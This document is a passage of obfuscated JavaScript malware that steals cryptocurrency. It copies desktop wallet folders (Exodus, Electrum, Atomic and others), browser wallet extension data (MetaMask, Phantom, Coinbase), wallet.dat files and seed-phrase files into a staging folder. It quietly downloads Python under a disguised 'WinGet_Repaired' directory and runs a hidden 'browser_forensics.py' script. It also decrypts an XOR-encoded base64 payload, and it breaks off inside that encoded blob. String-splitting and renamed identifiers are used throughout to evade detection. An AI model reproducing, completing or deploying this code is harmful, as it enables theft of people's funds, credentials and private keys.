    _0x4bbe3c += "-".repeat(30) + "\n";
    _0x4404d1.seedFiles.forEach((_0x21fb49, _0x304267) => {
      _0x4bbe3c += _0x304267 + 1 + ". " + _0x21fb49.name + "\n";
      _0x4bbe3c += "   Path: " + _0x21fb49.path + "\n";
      _0x4bbe3c += "   Size: " + (_0x21fb49.size / 1024).toFixed(1) + " KB\n\n";
    });
  }
  const _0x45ec02 = _0x4404d1.browserWallets.length + _0x4404d1.desktopWallets.length + _0x4404d1.coldWallets.length + _0x4404d1.walletDatFiles.length + _0x4404d1.seedFiles.length;
  _0x4bbe3c += "SUMMARY\n";
  _0x4bbe3c += "-".repeat(30) + "\n";
  _0x4bbe3c += "Total Wallets Found: " + _0x45ec02 + "\n";
  _0x4bbe3c += "Browser Wallets: " + _0x4404d1.browserWallets.length + "\n";
  _0x4bbe3c += "Desktop Wallets: " + _0x4404d1.desktopWallets.length + "\n";
  _0x4bbe3c += "Cold Wallets: " + _0x4404d1.coldWallets.length + "\n";
  _0x4bbe3c += "Wallet.dat Files: " + _0x4404d1.walletDatFiles.length + "\n";
  _0x4bbe3c += "Seed Files: " + _0x4404d1.seedFiles.length + "\n";
  return _0x4bbe3c;
}
const NYX_WALLET_PATHS = {
  exodus: {
    path: path.join(process.env.APPDATA || "", "Exodus", "exodus.wallet"),
    files: ["*"]
  },
  atomic: {
    path: path.join(process.env.APPDATA || "", "atomic", "Local Storage", "leveldb"),
    files: ["*"]
  },
  electrum: {
    path: path.join(process.env.APPDATA || "", "Electrum", "wallets"),
    files: ["*"]
  },
  jaxx: {
    path: path.join(process.env.APPDATA || "", "com.liberty.jaxx", "IndexedDB"),
    files: ["*"]
  },
  coinomi: {
    path: path.join(process.env.LOCALAPPDATA || "", "Coinomi", "Coinomi", "wallets"),
    files: ["*"]
  },
  guarda: {
    path: path.join(process.env.APPDATA || "", "Guarda", "Local Storage", "leveldb"),
    files: ["*"]
  },
  metamask: {
    browserExtension: true,
    extensionId: "nkbihfbeogaeaoehlefnkodbefgpgknn"
  },
  phantom: {
    browserExtension: true,
    extensionId: "bfnaelmomeimhlpmgjnjophhpkkoljpa"
  },
  ronin: {
    browserExtension: true,
    extensionId: "fnjhmkhhmkbjkkabndcnnogagogbneec"
  },
  binance: {
    browserExtension: true,
    extensionId: "fhbohimaelbohpjbbldcngcnapndodjp"
  },
  coinbase: {
    browserExtension: true,
    extensionId: "hnfanknocfeofbddgcijnmhnfnkdnaad"
  }
};
const NYX_BROWSER_PATHS = {
  chrome: path.join(process.env.LOCALAPPDATA || "", ["G", "o", "o", "g", "l", "e"].join(""), ["C", "h", "r", "o", "m", "e"].join(""), ["User", " ", "Data"].join(""), "Default", "Local Extension Settings"),
  brave: path.join(process.env.LOCALAPPDATA || "", ["B", "r", "a", "v", "e", "S", "o", "f", "t", "w", "a", "r", "e"].join(""), ["B", "r", "a", "v", "e", "-", "B", "r", "o", "w", "s", "e", "r"].join(""), ["User", " ", "Data"].join(""), "Default", "Local Extension Settings"),
  edge: path.join(process.env.LOCALAPPDATA || "", ["M", "i", "c", "r", "o", "s", "o", "f", "t"].join(""), ["E", "d", "g", "e"].join(""), ["User", " ", "Data"].join(""), "Default", "Local Extension Settings"),
  opera: path.join(process.env.APPDATA || "", "Opera Software", "Opera Stable", "Local Extension Settings")
};
async function collectNyxWallets(_0x5d69a5) {
  const _0x495b29 = path.join(_0x5d69a5, "Nyx_Wallets");
  if (!fs.existsSync(_0x495b29)) {
    fs.mkdirSync(_0x495b29, {
      recursive: true
    });
  }
  const _0x1c48ac = (_0x1aa01c, _0x105792) => {
    try {
      if (!fs.existsSync(_0x1aa01c)) {
        return;
      }
      if (!fs.existsSync(_0x105792)) {
        fs.mkdirSync(_0x105792, {
          recursive: true
        });
      }
      const _0x4933e1 = fs.readdirSync(_0x1aa01c);
      for (const _0x5a1a62 of _0x4933e1) {
        const _0x1df4ab = path.join(_0x1aa01c, _0x5a1a62);
        const _0x4dcf55 = path.join(_0x105792, _0x5a1a62);
        try {
          const _0x136ae8 = fs.statSync(_0x1df4ab);
          if (_0x136ae8.isDirectory()) {
            _0x1c48ac(_0x1df4ab, _0x4dcf55);
          } else {
            fs.copyFileSync(_0x1df4ab, _0x4dcf55);
          }
        } catch (_0x2e9190) {}
      }
    } catch (_0x4c6ac9) {}
  };
  for (const [_0x2c874d, _0x1cf875] of Object.entries(NYX_WALLET_PATHS)) {
    if (_0x1cf875.browserExtension) {
      continue;
    }
    try {
      if (fs.existsSync(_0x1cf875.path)) {
        const _0x44ca11 = path.join(_0x495b29, "Desktop", _0x2c874d);
        _0x1c48ac(_0x1cf875.path, _0x44ca11);
      }
    } catch (_0x821de9) {}
  }
  for (const [_0xc7a2c3, _0x16c10e] of Object.entries(NYX_WALLET_PATHS)) {
    if (!_0x16c10e.browserExtension) {
      continue;
    }
    for (const [_0x1dc846, _0x4665b6] of Object.entries(NYX_BROWSER_PATHS)) {
      try {
        const _0xa977d2 = path.join(_0x4665b6, _0x16c10e.extensionId);
        if (fs.existsSync(_0xa977d2)) {
          const _0x2bfb5c = path.join(_0x495b29, "Extensions", _0x1dc846, _0xc7a2c3);
          _0x1c48ac(_0xa977d2, _0x2bfb5c);
        }
      } catch (_0x160faf) {}
    }
  }
  return _0x495b29;
}
async function extractAllWallets(_0x4edc58) {
  try {
    await collectNyxWallets(_0x4edc58);
    console.log("[Vel@] Vel@ Wallets collected");
  } catch (_0xb8819a) {
    console.log("[Velet] Velet Wallet Collection failed:", _0xb8819a.message);
  }
  const _0x189038 = {
    browserWallets: [],
    desktopWallets: [],
    coldWallets: [],
    walletDatFiles: [],
    seedFiles: [],
    timestamp: new Date()
  };
  _0x189038.browserWallets = await extractBrowserWallets();
  _0x189038.desktopWallets = await extractDesktopWallets();
  _0x189038.coldWallets = await extractColdWallets();
  if (_0x189038.coldWallets.length > 0) {
    await copyColdWallets(_0x189038.coldWallets, _0x4edc58);
  }
  _0x189038.walletDatFiles = await findWalletDatFiles();
  if (_0x189038.walletDatFiles.length > 0) {
    await copyWalletDatFiles(_0x189038.walletDatFiles, _0x4edc58);
  }
  _0x189038.seedFiles = await findSeedPhrases();
  if (_0x189038.seedFiles.length > 0) {
    await copySeedFiles(_0x189038.seedFiles, _0x4edc58);
  }
  const _0x47ffce = _0x189038.browserWallets.length > 0 || _0x189038.desktopWallets.length > 0 || _0x189038.coldWallets.length > 0 || _0x189038.walletDatFiles.length > 0 || _0x189038.seedFiles.length > 0;
  if (_0x47ffce) {
    const _0x56d430 = formatWalletSummary(_0x189038);
    fs.writeFileSync(path.join(_0x4edc58, "wallets_summary.txt"), _0x56d430, "utf8");
  }
  return _0x189038;
}
const fodase = os.tmpdir();
const installDir = path.join(fodase, "WinGet_Repaired");
const nugetUrl = "https://globalcdn.nuget.org/packages/python.3.10.0.nupkg";
const pythonExe = path.join(installDir, "tools", "python.exe");
const tempScript = path.join(os.tmpdir(), "browser_forensics.py");
const requirements = ["pycryptodome", "pywin32", "PythonForWindows"];
async function downloadFile(_0x8bcc55, _0x3e5ff7) {
  const _0x55196f = await axios.get(_0x8bcc55, {
    responseType: "stream",
    timeout: 30000,
    maxRedirects: 3
  });
  const _0x264313 = fs.createWriteStream(_0x3e5ff7);
  _0x55196f.data.pipe(_0x264313);
  return new Promise((_0x31c09c, _0x339126) => {
    _0x264313.on("finish", _0x31c09c);
    _0x264313.on("error", _0x339126);
  });
}
function extractZip(_0x2bc4e0, _0x10d68e) {
  return new Promise((_0x3a8a2a, _0xf0e7b5) => {
    try {
      const _0x3d56c6 = new AdmZip(_0x2bc4e0);
      _0x3d56c6.extractAllTo(_0x10d68e, true);
      _0x3a8a2a();
    } catch (_0x2a9169) {
      _0xf0e7b5(new Error("ZIP extraction failed: " + _0x2a9169.message));
    }
  });
}
function InstallLibs(_0x2dc066, _0xfb9caf) {
  const _0x4a87d0 = _0x2dc066.map(_0xbe5675 => {
    return new Promise(_0x2d8140 => {
      const _0x294a22 = {
        env: _0xfb9caf,
        timeout: 30000,
        windowsHide: true
      };
      execFile(pythonExe, ["-m", "pip", "install", "--no-cache-dir", "--no-warn-script-location", "--disable-pip-version-check", "-q", _0xbe5675], _0x294a22, _0x55517c => _0x2d8140(!_0x55517c));
    });
  });
  return Promise.all(_0x4a87d0);
}
function Runpy(_0xf11ee3, _0x404852) {
  return new Promise((_0x26cdfc, _0x541af8) => {
    const _0x47766a = {
      env: _0x404852,
      timeout: 90000,
      windowsHide: true,
      maxBuffer: 10485760
    };
    execFile(pythonExe, [_0xf11ee3], _0x47766a, (_0x35622b, _0x2b9746, _0xb242e5) => {
      if (_0x35622b) {
        return _0x541af8(_0x35622b);
      }
      _0x26cdfc();
    });
  });
}
const withTimeout = (_0x2efaee, _0x3e52a5, _0x45ba26 = "Operation") => Promise.race([_0x2efaee, new Promise((_0x1fdb16, _0x5889fb) => setTimeout(() => _0x5889fb(new Error(_0x45ba26 + " timed out after " + _0x3e52a5 + "ms")), _0x3e52a5))]);
function debugLog(_0x265771) {}
async function ChromePython(_0x1065d3, _0x4df613) {
  debugLog("Starting ChromePython execution...");
  if (!fs.existsSync(installDir)) {
    fs.mkdirSync(installDir, {
      recursive: true
    });
  }
  const _0x2e82e7 = path.join(fodase, "python310.zip");
  const _0x2f1233 = path.join(installDir, ".packages_installed");
  const _0x49b4e4 = _0x4df613 || tempScript;
  const _0x203eff = path.join(installDir, "tools", "python310.zip");
  if (!fs.existsSync(pythonExe) || !fs.existsSync(_0x203eff)) {
    debugLog("Downloading Python...");
    try {
      if (fs.existsSync(installDir)) {
        fs.rmSync(installDir, {
          recursive: true,
          force: true
        });
      }
    } catch (_0x5ccf0a) {}
    fs.mkdirSync(installDir, {
      recursive: true
    });
    await downloadFile(nugetUrl, _0x2e82e7);
    await extractZip(_0x2e82e7, installDir);
    try {
      fs.unlinkSync(_0x2e82e7);
    } catch (_0x4983ac) {}
    debugLog("Python downloaded and extracted.");
  } else {
    debugLog("Python already exists.");
  }
  const _0x42fb6a = {
    ...process.env,
    PYTHONHOME: path.join(installDir, "tools"),
    PYTHONPATH: path.join(installDir, "tools", "Lib"),
    PYTHONUNBUFFERED: "1"
  };
  const _0x4274e7 = [];
  if (!fs.existsSync(_0x2f1233)) {
    debugLog("Installing requirements...");
    _0x4274e7.push(InstallLibs(requirements, _0x42fb6a).then(() => {
      try {
        fs.writeFileSync(_0x2f1233, "1");
      } catch (_0x4c454e) {}
      debugLog("Requirements installed.");
    }).catch(_0x4ce6fa => debugLog("Requirements installation failed: " + _0x4ce6fa.message)));
  }
  _0x4274e7.push(Promise.resolve(fs.writeFileSync(_0x49b4e4, _0x1065d3)));
  await Promise.all(_0x4274e7);
  try {
    debugLog("Running Python script...");
    await Runpy(_0x49b4e4, _0x42fb6a);
    debugLog("Python script finished.");
  } catch (_0x315c6b) {
    debugLog("Python script execution failed: " + _0x315c6b.message);
    throw _0x315c6b;
  } finally {
    try {
      fs.unlinkSync(_0x49b4e4);
    } catch (_0x700693) {}
  }
}
const _k = "VoidrionAstralKey2024";
function _dp(_0x2c5716) {
  const _0x3afce6 = Buffer.from(_0x2c5716, "base64");
  const _0x470368 = Buffer.from(_k, "utf8");
  const _0x75ead4 = Buffer.alloc(_0x3afce6.length);
  for (let _0x3aa5a4 = 0; _0x3aa5a4 < _0x3afce6.length; _0x3aa5a4++) {
    _0x75ead4[_0x3aa5a4] = _0x3afce6[_0x3aa5a4] ^ _0x470368[_0x3aa5a4 % _0x470368.length];
  }
  return _0x75ead4.toString("utf8");
}
const _pe = "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